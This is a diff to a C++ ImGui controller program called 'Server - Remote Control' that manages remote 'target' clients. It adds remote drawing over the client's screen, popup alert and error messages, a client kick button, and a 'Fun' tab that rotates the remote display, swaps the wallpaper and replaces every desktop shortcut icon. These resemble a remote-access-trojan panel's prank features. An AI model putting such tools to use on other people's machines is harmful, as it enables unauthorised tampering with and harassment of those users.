@@ -20,6 +20,7 @@
 #include <cstring>
 #include <cstdio>
 #include <cmath>
+#include <cstdlib>
 #include <cctype>
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "winmm.lib")
@@ -75,6 +76,20 @@ static char g_procFilter[128] = "";
 static char g_keyInput[512] = "";
 static char g_uploadPath[512] = "";
 static char g_runPath[512] = "";
+
+// Draw
+static bool g_drawing = false;
+static float g_drawR = 1.0f, g_drawG = 0.3f, g_drawB = 0.3f;
+static int g_drawSize = 5;
+
+// Message
+static char g_msgText[512] = "";
+static int g_msgType = 3; // 0=info 1=warning 2=error
+
+// Fun
+static int g_screenAngle = 0;
+static char g_wallpaperPath[512] = "";
+static char g_iconPath[512] = "";
 
 static int g_tab = 0;
 static float g_animTime = 0.0f;  // for loading animations
@@ -517,6 +532,90 @@ static void sendKillProcess(uint32_t pid) {
     addLog("[>] Kill: PID %u", pid);
 }
 
+static void sendDraw(uint8_t dtype, int x, int y, uint8_t r, uint8_t g, uint8_t b, int size) {
+    if (!canSend()) return;
+    proto::Writer w;
+    w.u8(dtype);
+    w.u32((uint32_t)x);
+    w.u32((uint32_t)y);
+    w.u8(r);
+    w.u8(g);
+    w.u8(b);
+    w.u32((uint32_t)size);
+    sendCommand(proto::CMD_DRAW, w.bytes());
+}
+
+static void sendClearDraw() {
+    if (!canSend()) return;
+    proto::Writer w;
+    w.u8(1); // clear
+    w.u32(0); w.u32(0); w.u8(0); w.u8(0); w.u8(0); w.u32(0);
+    sendCommand(proto::CMD_DRAW, w.bytes());
+    addLog("[>] Draw: cleared");
+}
+
+static void sendRotateScreen(uint8_t angle) {
+    if (!canSend()) return;
+    proto::Writer w;
+    w.u8(angle);
+    sendCommand(proto::CMD_ROTATE_SCREEN, w.bytes());
+    addLog("[>] Rotate screen: %u degrees", (unsigned)angle);
+}
+
+static void sendMessage() {
+    if (strlen(g_msgText) == 0 || !canSend()) return;
+    proto::Writer w;
+    w.u8((uint8_t)g_msgType);
+    w.str(std::string(g_msgText));
+    sendCommand(proto::CMD_MESSAGE, w.bytes());
+    const char* tname = g_msgType == 2 ? "Error" : (g_msgType == 1 ? "Warning" : "Info");
+    addLog("[>] %s: %s", tname, g_msgText);
+}
+
+static void sendRotateScreen(int angle) {
+    if (!canSend()) return;
+    proto::Writer w;
+    w.u32((uint32_t)angle);
+    sendCommand(proto::CMD_ROTATE_SCREEN, w.bytes());
+    addLog("[>] Rotate screen: %d degrees", angle);
+}
+
+static void sendSetWallpaper(const std::string& localPath) {
+    if (!canSend()) return;
+    FILE* f = nullptr;
+    fopen_s(&f, localPath.c_str(), "rb");
+    if (!f) { addLog("[!] Cannot open: %s", localPath.c_str()); return; }
+    fseek(f, 0, SEEK_END);
+    size_t sz = ftell(f);
+    fseek(f, 0, SEEK_SET);
+    std::vector<uint8_t> data(sz);
+    fread(data.data(), 1, sz, f);
+    fclose(f);
+
+    proto::Writer w;
+    w.u32((uint32_t)sz);
+    w.raw(data.data(), sz);
+    sendCommand(proto::CMD_SET_WALLPAPER, w.bytes());
+    addLog("[>] Wallpaper: %s (%zu bytes)", localPath.c_str(), sz);
+}
+
+static void sendReplaceIcons(const std::string& iconPath) {
+    if (!canSend()) return;
+    proto::Writer w;
+    w.str(iconPath);
+    sendCommand(proto::CMD_REPLACE_ICONS, w.bytes());
+    addLog("[>] Replace icons: %s", iconPath.c_str());
+}
+
+static void sendKickClient(uint32_t clientId) {
+    if (!g_connected) return;
+    proto::Writer w;
+    w.u32(clientId);
+    auto m = proto::buildMessage(proto::MSG_KICK_CLIENT, 0, w.bytes());
+    ws::sendAll(g_sock, m.data(), m.size());
+    addLog("[!] Kick client: #%u", clientId);
+}
+
 // ═══════════════════════════════════════════════════════════════════
 //  SIDEBAR — Connection status + Client list
 // ═══════════════════════════════════════════════════════════════════
@@ -634,10 +733,27 @@ static void drawSidebar(float w) {
                 g_selectedClient = c.id;
                 addLog("[*] Target: %s (#%u)", c.name.c_str(), c.id);
             }
+            if (ImGui::IsItemClicked(1)) {
+                // Right-click → context menu
+                ImGui::OpenPopup(("ctx" + std::to_string(c.id)).c_str());
+            }
+            if (ImGui::BeginPopup(("ctx" + std::to_string(c.id)).c_str())) {
+                if (ImGui::Selectable("Disconnect")) sendKickClient(c.id);
+                ImGui::EndPopup();
+            }
             ImGui::Dummy(ImVec2(0, 4));
             ImGui::PopID();
         }
     }
+
+    // ── Disconnect button for currently selected client ──
+    ImGui::Dummy(ImVec2(0, 6));
+    ImGui::SetCursorPosX(14);
+    if (g_selectedClient != 0) {
+        if (ghostBtn("  Disconnect Client", ImVec2(w - 28, 30)))
+            sendKickClient(g_selectedClient);
+    }
+    ImGui::Dummy(ImVec2(0, 24));
 
     ImGui::EndChild();
 }
@@ -655,9 +771,9 @@ static void drawNav(float w) {
 
     // Tabs
     ImGui::SetCursorScreenPos(ImVec2(p0.x + 16, p0.y + 11));
-    const char* labels[] = {"Files", "System", "Screen", "Execute", "Processes", "Tools"};
-    const ImVec4* accs[] = {&DS::Accent, &DS::Purple, &DS::Orange, &DS::Green, &DS::Red, &DS::Yellow};
-    for (int i = 0; i < 6; i++) {
+    const char* labels[] = {"Files", "System", "Screen", "Execute", "Processes", "Tools", "Message", "Fun"};
+    const ImVec4* accs[] = {&DS::Accent, &DS::Purple, &DS::Orange, &DS::Green, &DS::Red, &DS::Yellow, &DS::Accent, &DS::Red};
+    for (int i = 0; i < 8; i++) {
         if (i > 0) ImGui::SameLine(0, 4);
         if (navPill(labels[i], g_tab == i, *accs[i])) g_tab = i;
     }
@@ -839,6 +955,16 @@ static void drawScreen(float w) {
         ImGui::SliderFloat("##iv", &g_refreshInterval, 0.5f, 10.0f, "%.1fs");
         ImGui::PopItemWidth();
     }
+    ImGui::SameLine(0, 16);
+    ImGui::SetCursorPosY(ImGui::GetCursorPosY() + 4);
+    ImGui::TextColored(DS::T3, "Rotate:");
+    if (ghostBtn("0°", ImVec2(40, 34))) sendRotateScreen(0);
+    ImGui::SameLine(0, 2);
+    if (ghostBtn("90°", ImVec2(40, 34))) sendRotateScreen(90);
+    ImGui::SameLine(0, 2);
+    if (ghostBtn("180°", ImVec2(50, 34))) sendRotateScreen(180);
+    ImGui::SameLine(0, 2);
+    if (ghostBtn("270°", ImVec2(50, 34))) sendRotateScreen(270);
 
     // Key input bar
     ImGui::Dummy(ImVec2(0, 8));
@@ -853,6 +979,22 @@ static void drawScreen(float w) {
         g_keyInput[0] = 0;
     }
 
+    // Drawing tools
+    ImGui::Dummy(ImVec2(0, 8));
+    ImGui::TextColored(DS::T3, "Draw on remote screen:");
+    ImGui::SameLine(0, 12);
+    ImGui::Checkbox("Draw mode", &g_drawing);
+    if (g_drawing) {
+        ImGui::SameLine(0, 12);
+        ImGui::PushItemWidth(120);
+        ImGui::ColorEdit3("##dc", &g_drawR, ImGuiColorEditFlags_NoInputs);
+        ImGui::SameLine(0, 8);
+        ImGui::SliderInt("##ds", &g_drawSize, 1, 30, "Size %d");
+        ImGui::PopItemWidth();
+        ImGui::SameLine(0, 8);
+        if (ghostBtn("Clear", ImVec2(70, 28))) sendClearDraw();
+    }
+
     ImGui::Dummy(ImVec2(0, 8));
 
     float ah = ImGui::GetContentRegionAvail().y;
@@ -865,41 +1007,44 @@ static void drawScreen(float w) {
         ImVec2 sz(g_screenTexW * sc, g_screenTexH * sc);
         float ox = (w - sz.x) * 0.5f;
         if (ox > 0) ImGui::SetCursorPosX(ImGui::GetCursorPosX() + ox);
+
         ImGui::Image((ImTextureID)g_screenTexture, sz);
 
-        // ── Interactive click overlay ──
         ImVec2 imgMin = ImGui::GetItemRectMin();
-        ImVec2 imgMax = ImGui::GetItemRectMax();
         if (ImGui::IsItemHovered()) {
-            // Left click
-            if (ImGui::IsMouseClicked(0)) {
-                ImVec2 mp = ImGui::GetMousePos();
-                int cx = (int)((mp.x - imgMin.x) / sc);
-                int cy = (int)((mp.y - imgMin.y) / sc);
-                sendMouseClick(cx, cy, 0); // left
-                if (g_autoRefresh) g_refreshTimer = g_refreshInterval; // force quick refresh
-            }
-            // Right click
-            if (ImGui::IsMouseClicked(1)) {
-                ImVec2 mp = ImGui::GetMousePos();
-                int cx = (int)((mp.x - imgMin.x) / sc);
-                int cy = (int)((mp.y - imgMin.y) / sc);
-                sendMouseClick(cx, cy, 1); // right
-                if (g_autoRefresh) g_refreshTimer = g_refreshInterval;
-            }
-            // Double click
-            if (ImGui::IsMouseDoubleClicked(0)) {
-                ImVec2 mp = ImGui::GetMousePos();
-                int cx = (int)((mp.x - imgMin.x) / sc);
-                int cy = (int)((mp.y - imgMin.y) / sc);
-                sendMouseClick(cx, cy, 2); // double
-                if (g_autoRefresh) g_refreshTimer = g_refreshInterval;
+            ImVec2 mp = ImGui::GetMousePos();
+            int cx = (int)((mp.x - imgMin.x) / sc);
+            int cy = (int)((mp.y - imgMin.y) / sc);
+
+            if (g_drawing) {
+                // Drawing mode — send draw commands
+                if (ImGui::IsMouseDown(0)) {
+                    uint8_t r = (uint8_t)(g_drawR * 255);
+                    uint8_t g = (uint8_t)(g_drawG * 255);
+                    uint8_t b = (uint8_t)(g_drawB * 255);
+                    sendDraw(0, cx, cy, r, g, b, g_drawSize);
+                }
+            } else {
+                // Click mode
+                if (ImGui::IsMouseClicked(0)) {
+                    sendMouseClick(cx, cy, 0);
+                    if (g_autoRefresh) g_refreshTimer = g_refreshInterval;
+                }
+                if (ImGui::IsMouseClicked(1)) {
+                    sendMouseClick(cx, cy, 1);
+                    if (g_autoRefresh) g_refreshTimer = g_refreshInterval;
+                }
+                if (ImGui::IsMouseDoubleClicked(0)) {
+                    sendMouseClick(cx, cy, 2);
+                    if (g_autoRefresh) g_refreshTimer = g_refreshInterval;
+                }
             }
         }
-        // Hint
-        ImGui::TextColored(DS::T3, "  Left click = single | Right click = right | Double click = double");
+        ImGui::TextColored(DS::T3, "  %s",
+            g_drawing ? "Draw mode: hold left mouse to draw on screen" :
+                        "Click = left | Right-click = right | Double = double-click");
     } else {
-        emptyState("Click 'Capture' above", "then click on the image to send mouse clicks", w);
+        emptyState("Click 'Capture' above", "then click on the image to interact", w);
     }
 }
 
@@ -1069,6 +1214,117 @@ static void drawTools(float w) {
 }
 
 // ═══════════════════════════════════════════════════════════════════
+//  TAB: Message — Send alerts to client
+// ═══════════════════════════════════════════════════════════════════
+static void drawMessage(float w) {
+    label("MESSAGE TYPE");
+    ImGui::Dummy(ImVec2(0, 4));
+
+    // Type selector
+    if (ImGui::RadioButton("  Info", g_msgType == 0)) g_msgType = 0; ImGui::SameLine(0, 16);
+    if (ImGui::RadioButton("  Warning", g_msgType == 1)) g_msgType = 1; ImGui::SameLine(0, 16);
+    if (ImGui::RadioButton("  Error", g_msgType == 2)) g_msgType = 2;
+
+    ImGui::Dummy(ImVec2(0, 12));
+
+    label("MESSAGE TEXT");
+    ImGui::PushItemWidth(w - 120);
+    bool msgEnter = ImGui::InputTextWithHint("##msg", "Enter message to display on client screen...",
+        g_msgText, sizeof(g_msgText), ImGuiInputTextFlags_EnterReturnsTrue);
+    ImGui::PopItemWidth();
+    ImGui::SameLine(0, 8);
+
+    ImVec4 btnCol = DS::Accent;
+    const char* btnLabel = "  Send  ";
+    if (g_msgType == 1) { btnCol = DS::Yellow; btnLabel = "  Warn  "; }
+    if (g_msgType == 2) { btnCol = DS::Red;    btnLabel = "  Error  "; }
+    if (ctaBtn(btnLabel, btnCol, ImVec2(100, 38)) || msgEnter) {
+        sendMessage();
+        g_msgText[0] = 0;
+    }
+
+    ImGui::Dummy(ImVec2(0, 16));
+    ImGui::TextColored(DS::T3, "  The message will appear as a popup MessageBox on the client.");
+    ImGui::TextColored(DS::T3, "  Info = blue icon | Warning = yellow icon | Error = red icon");
+}
+
+// ═══════════════════════════════════════════════════════════════════
+//  TAB: Fun — Rotate screen, wallpaper, icon chaos
+// ═══════════════════════════════════════════════════════════════════
+static void drawFun(float w) {
+    // ── Section: Rotate Screen ──
+    label("ROTATE SCREEN (REMOTE PC DISPLAY)");
+
+    ImGui::Dummy(ImVec2(0, 6));
+    ImGui::SetCursorPosX(12);
+
+    // Angle buttons
+    if (ctaBtn("  0\u00B0  Normal", g_screenAngle == 0 ? DS::Accent : DS::Card, ImVec2(120, 38))) {
+        g_screenAngle = 0;
+        sendRotateScreen(0);
+    }
+    ImGui::SameLine(0, 6);
+    if (ctaBtn("  90\u00B0",  g_screenAngle == 90  ? DS::Accent : DS::Card, ImVec2(80, 38))) {
+        g_screenAngle = 90;
+        sendRotateScreen(90);
+    }
+    ImGui::SameLine(0, 6);
+    if (ctaBtn("  180\u00B0", g_screenAngle == 180 ? DS::Accent : DS::Card, ImVec2(80, 38))) {
+        g_screenAngle = 180;
+        sendRotateScreen(180);
+    }
+    ImGui::SameLine(0, 6);
+    if (ctaBtn("  270\u00B0", g_screenAngle == 270 ? DS::Accent : DS::Card, ImVec2(80, 38))) {
+        g_screenAngle = 270;
+        sendRotateScreen(270);
+    }
+
+    ImGui::Dummy(ImVec2(0, 6));
+    ImGui::TextColored(DS::T3, "  Reboots display driver. Physical screen will rotate.");
+    ImGui::TextColored(DS::T3, "  Save any open work before rotating.");
+
+    // ── Section: Wallpaper ──
+    ImGui::Dummy(ImVec2(0, 18));
+    label("SET WALLPAPER ON REMOTE DESKTOP");
+
+    ImGui::Dummy(ImVec2(0, 6));
+    ImGui::SetCursorPosX(12);
+    ImGui::PushItemWidth(w - 200);
+    ImGui::InputTextWithHint("##wppath",
+        "  C:\\path\\to\\wallpaper.jpg  (or PNG, BMP \u2014 max 1MB)",
+        g_wallpaperPath, sizeof(g_wallpaperPath));
+    ImGui::PopItemWidth();
+    ImGui::SameLine(0, 8);
+    if (ctaBtn("  Set WP  ", DS::Purple, ImVec2(110, 38)))
+        sendSetWallpaper(std::string(g_wallpaperPath));
+
+    ImGui::Dummy(ImVec2(0, 6));
+    ImGui::TextColored(DS::T3, "  Image is uploaded and applied as the desktop background.");
+    ImGui::TextColored(DS::T3, "  Saved to %USERPROFILE%\\wallpaper_remote.jpg");
+
+    // ── Section: Replace Desktop Icons ──
+    ImGui::Dummy(ImVec2(0, 18));
+    label("REPLACE ALL DESKTOP ICONS");
+
+    ImGui::Dummy(ImVec2(0, 6));
+    ImGui::SetCursorPosX(12);
+    ImGui::PushItemWidth(w - 200);
+    ImGui::InputTextWithHint("##iconpath",
+        "  C:\\path\\to\\icon.ico  (or .exe / .dll containing icons)",
+        g_iconPath, sizeof(g_iconPath));
+    ImGui::PopItemWidth();
+    ImGui::SameLine(0, 8);
+    if (ctaBtn("  Replace  ", DS::Orange, ImVec2(110, 38)))
+        sendReplaceIcons(std::string(g_iconPath));
+
+    ImGui::Dummy(ImVec2(0, 6));
+    ImGui::TextColored(DS::T3, "  Replaces the icon of EVERY .lnk shortcut on the desktop.");
+    ImGui::TextColored(DS::T3, "  Point to a .ico file, or an .exe/.dll with embedded icons.");
+    ImGui::TextColored(ImVec4(0.7f, 0.5f, 0.2f, 1),
+        "  WARNING: desktop icons will change globally. Refresh desktop to see.");
+}
+
+// ═══════════════════════════════════════════════════════════════════
 //  LOG PANEL
 // ═══════════════════════════════════════════════════════════════════
 static void drawLog(float w, float h) {
@@ -1168,6 +1424,8 @@ static void onDraw() {
         case 3: drawExec(tabW);       break;
         case 4: drawProcesses(tabW);  break;
         case 5: drawTools(tabW);      break;
+        case 6: drawMessage(tabW);    break;
+        case 7: drawFun(tabW);        break;
     }
     ImGui::EndChild();
 
@@ -1185,7 +1443,14 @@ int main() {
     Gdiplus::GdiplusStartupInput gi;
     Gdiplus::GdiplusStartup(&g_gdiplusToken, &gi, nullptr);
     ws::init();
-    int r = imguiRun(L"Server - Remote Control", 1100, 750, []() { applyStyle(); }, onDraw);
+    int r = imguiRun(L"Server - Remote Control", 1100, 750, []() {
+        applyStyle();
+        // Auto-connect if SERVER_AUTOCONNECT env var set
+        const char* env = std::getenv("SERVER_AUTOCONNECT");
+        if (env && env[0] == '1' && !g_connected) {
+            doConnect();
+        }
+    }, onDraw);
     if (g_connected) doDisconnect();
     if (g_screenTexture) imguiReleaseTexture(g_screenTexture);
     Gdiplus::GdiplusShutdown(g_gdiplusToken);
